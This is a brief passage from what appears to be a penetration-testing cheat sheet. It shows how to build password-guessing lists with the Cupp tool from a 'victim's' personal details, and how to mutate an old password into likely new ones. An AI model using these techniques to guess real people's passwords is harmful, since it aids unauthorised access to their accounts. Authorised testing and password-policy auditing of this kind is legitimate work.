#### Generate Passwords From Victim Information <a href="#generate-passwords-from-victim-information" id="generate-passwords-from-victim-information"></a>

Using [Cupp](https://github.com/Mebus/cupp), we can generate a password list from victim's personal information.

```
# -i: Interactive mode
python3 cupp -i
```

#### Generate Passwords From Old One <a href="#generate-passwords-from-old-one" id="generate-passwords-from-old-one"></a>

```
password2021 -> password2022, password2023
april123 -> may123, june123
apple -> banana, orange
```

### References <a href="#references" id="references"></a>

* [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
